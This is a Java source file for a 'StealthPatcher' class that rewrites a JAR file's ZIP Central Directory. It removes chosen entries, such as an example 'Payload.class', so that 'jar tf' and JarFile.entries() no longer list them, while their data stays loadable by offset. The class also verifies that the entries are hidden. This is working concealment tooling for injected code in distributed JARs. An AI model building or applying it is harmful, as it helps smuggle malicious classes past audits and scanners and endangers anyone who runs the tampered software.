package dev.naruto.astrox.core;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.*;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.channels.FileChannel;
import java.util.*;
import java.util.zip.*;

/**
 * Stealth post-processor that hides injected entries from {@code JarFile.entries()}
 * by removing them from the ZIP Central Directory while preserving the Local File Headers.
 *
 * <p>This exploits the ZIP format specification (APPNOTE.TXT §4.3.12):
 * Java's {@code JarFile} only iterates the Central Directory to enumerate entries.
 * If an entry is removed from the Central Directory but its Local File Header + data remain
 * intact, the class can still be loaded by a ClassLoader that knows the exact offset.</p>
 *
 * <p><b>WARNING:</b> This is fragile. The patched JAR will still be a valid ZIP, but tools
 * like {@code jar tf} and {@code JarFile.entries()} will not list the hidden entries.</p>
 */
public class StealthPatcher {

    private static final Logger LOG = LoggerFactory.getLogger(StealthPatcher.class);

    // ZIP magic numbers
    private static final int LOCAL_FILE_HEADER_SIG = 0x04034b50;
    private static final int CENTRAL_DIR_SIG = 0x02014b50;
    private static final int END_OF_CENTRAL_DIR_SIG = 0x06054b50;

    private final Set<String> entriesToHide;

    /**
     * @param entriesToHide set of entry names (e.g., "com/example/Payload.class") to hide
     */
    public StealthPatcher(Set<String> entriesToHide) {
        this.entriesToHide = new LinkedHashSet<>(entriesToHide);
    }

    /**
     * Patch a JAR file in-place, removing specified entries from the Central Directory.
     *
     * @param jarFile the JAR file to patch
     * @return true if patching succeeded and verification passed
     */
    public boolean patch(File jarFile) {
        LOG.debug("Stealth patching: hiding {} entries from Central Directory", entriesToHide.size());

        try {
            byte[] original = readFile(jarFile);
            byte[] patched = removeCentralDirectoryEntries(original);

            if (patched == null) {
                LOG.warn("Stealth patching failed — Central Directory parsing error");
                return false;
            }

            // Verify the patched JAR is still a valid ZIP
            if (!verifyZip(patched)) {
                LOG.warn("Stealth patching produced invalid ZIP — reverting");
                return false;
            }

            // Verify hidden entries are actually hidden from JarFile.entries()
            File tempFile = File.createTempFile("astrox_verify_", ".jar");
            try {
                writeFile(tempFile, patched);
                if (!verifyHidden(tempFile)) {
                    LOG.warn("Stealth verification failed — entries still visible");
                    return false;
                }
            } finally {
                tempFile.delete();
            }

            // Write patched JAR
            writeFile(jarFile, patched);
            LOG.info("Stealth patch applied: {} entries hidden", entriesToHide.size());
            return true;

        } catch (Exception e) {
            LOG.error("Stealth patching failed", e);
            return false;
        }
    }

    /**
     * Remove specified entries from the ZIP Central Directory.
     * Preserves Local File Headers and data so classes can still be loaded by offset.
     */
    private byte[] removeCentralDirectoryEntries(byte[] zipData) {
        try {
            ByteBuffer buf = ByteBuffer.wrap(zipData).order(ByteOrder.LITTLE_ENDIAN);

            // Find End of Central Directory record
            int eocdOffset = findEOCD(buf);
            if (eocdOffset < 0) {
                LOG.error("Cannot find End of Central Directory record");
                return null;
            }

            buf.position(eocdOffset + 8);
            // Skip: signature(4) + diskNumber(2) + centralDirDisk(2)
            int totalEntries = buf.getShort() & 0xFFFF;
            buf.getShort(); // total entries on this disk (skip duplicate)
            int centralDirSize = buf.getInt();
            int centralDirOffset = buf.getInt();

            // Parse all Central Directory entries
            List<CentralDirEntry> entries = new ArrayList<>();
            int pos = centralDirOffset;

            for (int i = 0; i < totalEntries; i++) {
                buf.position(pos);
                int sig = buf.getInt();
                if (sig != CENTRAL_DIR_SIG) {
                    LOG.error("Invalid Central Directory signature at offset {}", pos);
                    return null;
                }

                buf.position(pos + 10);
                // Skip: versionMadeBy(2) + versionNeeded(2) + flags(2) + compression(2)
                int compMethod = buf.getShort() & 0xFFFF;

                buf.position(pos + 28);
                int fileNameLen = buf.getShort() & 0xFFFF;
                int extraLen = buf.getShort() & 0xFFFF;
                int commentLen = buf.getShort() & 0xFFFF;

                buf.position(pos + 46);
                byte[] nameBytes = new byte[fileNameLen];
                buf.get(nameBytes);
                String fileName = new String(nameBytes);

                int entrySize = 46 + fileNameLen + extraLen + commentLen;

                boolean hide = entriesToHide.contains(fileName);
                entries.add(new CentralDirEntry(pos, entrySize, fileName, hide));

                pos += entrySize;
            }

            // Rebuild the Central Directory without hidden entries
            ByteArrayOutputStream newCd = new ByteArrayOutputStream();
            int keptCount = 0;

            for (CentralDirEntry entry : entries) {
                if (!entry.hide) {
                    newCd.write(zipData, entry.offset, entry.size);
                    keptCount++;
                } else {
                    LOG.debug("  Hiding entry: {}", entry.name);
                }
            }

            byte[] newCdBytes = newCd.toByteArray();

            // Build new ZIP: [local file headers + data] + [new central directory] + [EOCD]
            ByteArrayOutputStream result = new ByteArrayOutputStream();

            // Copy everything before the original Central Directory
            result.write(zipData, 0, centralDirOffset);

            // Write filtered Central Directory
            int newCdOffset = centralDirOffset;
            result.write(newCdBytes);

            // Write updated EOCD
            ByteBuffer eocd = ByteBuffer.allocate(22).order(ByteOrder.LITTLE_ENDIAN);
            eocd.putInt(END_OF_CENTRAL_DIR_SIG);
            eocd.putShort((short) 0); // disk number
            eocd.putShort((short) 0); // central dir start disk
            eocd.putShort((short) keptCount); // entries on this disk
            eocd.putShort((short) keptCount); // total entries
            eocd.putInt(newCdBytes.length); // central dir size
            eocd.putInt(newCdOffset); // central dir offset
            eocd.putShort((short) 0); // comment length
            result.write(eocd.array());

            return result.toByteArray();

        } catch (Exception e) {
            LOG.error("Error parsing ZIP structure", e);
            return null;
        }
    }

    /**
     * Find the End of Central Directory record by scanning backward.
     */
    private int findEOCD(ByteBuffer buf) {
        for (int i = buf.capacity() - 22; i >= 0; i--) {
            if (buf.getInt(i) == END_OF_CENTRAL_DIR_SIG) {
                return i;
            }
        }
        return -1;
    }

    /**
     * Verify the patched data is a valid ZIP by attempting to open it.
     */
    private boolean verifyZip(byte[] data) {
        try {
            File temp = File.createTempFile("astrox_verify_", ".zip");
            try {
                writeFile(temp, data);
                try (ZipFile zf = new ZipFile(temp)) {
                    // Just opening it is enough to validate structure
                    return zf.size() >= 0;
                }
            } finally {
                temp.delete();
            }
        } catch (Exception e) {
            return false;
        }
    }

    /**
     * Verify that hidden entries are not visible via JarFile.entries().
     */
    private boolean verifyHidden(File jarFile) {
        try (java.util.jar.JarFile jar = new java.util.jar.JarFile(jarFile)) {
            Set<String> visible = new HashSet<>();
            jar.stream().forEach(e -> visible.add(e.getName()));

            for (String hidden : entriesToHide) {
                if (visible.contains(hidden)) {
                    LOG.debug("Entry still visible: {}", hidden);
                    return false;
                }
            }
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    private static byte[] readFile(File file) throws IOException {
        try (FileChannel ch = new FileInputStream(file).getChannel()) {
            ByteBuffer buf = ByteBuffer.allocate((int) ch.size());
            ch.read(buf);
            return buf.array();
        }
    }

    private static void writeFile(File file, byte[] data) throws IOException {
        try (FileOutputStream fos = new FileOutputStream(file)) {
            fos.write(data);
        }
    }

    private record CentralDirEntry(int offset, int size, String name, boolean hide) {}
}
